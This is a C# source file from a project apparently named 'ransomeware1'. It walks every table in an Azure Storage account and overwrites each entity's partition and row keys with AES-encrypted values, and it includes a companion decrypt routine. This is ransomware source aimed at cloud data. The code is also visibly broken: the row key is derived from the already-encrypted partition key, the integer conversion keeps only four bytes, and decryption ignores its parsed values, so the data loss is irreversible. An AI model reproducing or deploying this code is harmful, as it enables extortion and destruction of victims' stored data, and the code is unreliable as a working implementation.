using Microsoft.WindowsAzure.Storage; // Namespace for CloudStorageAccount
using Microsoft.WindowsAzure.Storage.Table; // Namespace for Table storage types
using System;
using System.Text;
using ransomeware1;


public static class Table_Storage
{
    
    public static void EncryptTables(CloudStorageAccount storageAccount, AESEncryption encrypt)
    {

        // Create the table client.
        // Table has no snapshot so nothing to disable.
        CloudTableClient tableClient = storageAccount.CreateCloudTableClient();

        foreach (CloudTable table in tableClient.ListTables())
        {

        // Retrieve reference to a previously created tables.
        CloudTable tbl = tableClient.GetTableReference(table.Name);
            
        TableQuery query = new TableQuery();

        foreach (ITableEntity entity in table.ExecuteQuery(query))
        {
                // Create a retrieve operation that takes a customer entity.
                TableOperation retrieveOperation = TableOperation.Retrieve(entity.PartitionKey, entity.RowKey);

                // Execute the operation.
                TableResult retrievedResult = table.Execute(retrieveOperation);

                // Assign the result to a CustomerEntity object.
                ITableEntity updateEntity = (ITableEntity) retrievedResult.Result;

                if (updateEntity != null)
                {
                    //encrypt the entity's properties (patition & row)
                     EncryptFitTableConstrains(entity, tbl, encrypt);
                }
            }
            Console.Read(); //keep console open for dubug
        }
    }


    public static void DecryptTables(CloudStorageAccount storageAccount, AESDecryption decrypt)
    {

        // Create the table client.
        // Table has no snapshot so nothing to disable.
        CloudTableClient tableClient = storageAccount.CreateCloudTableClient();

        foreach (CloudTable table in tableClient.ListTables())
        {

            // Retrieve reference to a previously created tables.
            CloudTable tbl = tableClient.GetTableReference(table.Name);

            TableQuery query = new TableQuery();

            foreach (ITableEntity entity in table.ExecuteQuery(query))
            {
                // Create a retrieve operation that takes a customer entity.
                TableOperation retrieveOperation = TableOperation.Retrieve(entity.PartitionKey, entity.RowKey);

                // Execute the operation.
                TableResult retrievedResult = table.Execute(retrieveOperation);

                // Assign the result to a CustomerEntity object.
                ITableEntity updateEntity = (ITableEntity)retrievedResult.Result;

                if (updateEntity != null)
                {
                    //encrypt the entity's properties (patition & row)
                    DecryptFitTableConstrains(entity, tbl, decrypt);
                }
            }
            Console.Read(); //keep console open for dubug
        }
    }


    public static void EncryptFitTableConstrains(ITableEntity updateEntity, CloudTable table, AESEncryption encrypt)
    {

        updateEntity.PartitionKey = encrypt.TableEncryptAES(updateEntity.PartitionKey);
        updateEntity.RowKey = encrypt.TableEncryptAES(updateEntity.PartitionKey);
      
        //convert to bytes
        byte[] PartitionKeyRecord = Encoding.ASCII.GetBytes(updateEntity.PartitionKey);
        byte[] RowKeyRecord = Encoding.ASCII.GetBytes(updateEntity.RowKey);

        //convert the bytes to ints
        int intPartitionKey = BitConverter.ToInt32(PartitionKeyRecord, 0);
        int intRowKey = BitConverter.ToInt32(RowKeyRecord, 0);

        //convert the ints to strings (like 12 -> "12")
        updateEntity.PartitionKey = intPartitionKey.ToString();
        updateEntity.RowKey = intRowKey.ToString();


        // Create the TableOperation object that inserts the entity.
        TableOperation insertOperation = TableOperation.Insert(updateEntity);

        // Execute the insert operation.
        table.Execute(insertOperation);

    }

    public static void DecryptFitTableConstrains(ITableEntity updateEntity, CloudTable table, AESDecryption decrypt)
    {

        //convert string to int
        int IntRowKey = Int32.Parse(updateEntity.RowKey);
        int IntPartitionKey = Int32.Parse(updateEntity.PartitionKey);

        //convert to bytes
        byte[] PartitionKeyRecord = Encoding.ASCII.GetBytes(updateEntity.PartitionKey);
        byte[] RowKeyRecord = Encoding.ASCII.GetBytes(updateEntity.RowKey);

        //convert the bytes to string
        updateEntity.PartitionKey = System.Text.Encoding.UTF8.GetString(PartitionKeyRecord);
        updateEntity.RowKey = System.Text.Encoding.UTF8.GetString(RowKeyRecord);

        updateEntity.PartitionKey = decrypt.TableDecryptAES(updateEntity.PartitionKey);
        updateEntity.RowKey = decrypt.TableDecryptAES(updateEntity.PartitionKey);

        // Create the TableOperation object that inserts the entity.
        TableOperation insertOperation = TableOperation.Insert(updateEntity);

        // Execute the insert operation.
        table.Execute(insertOperation);

    }
    
}
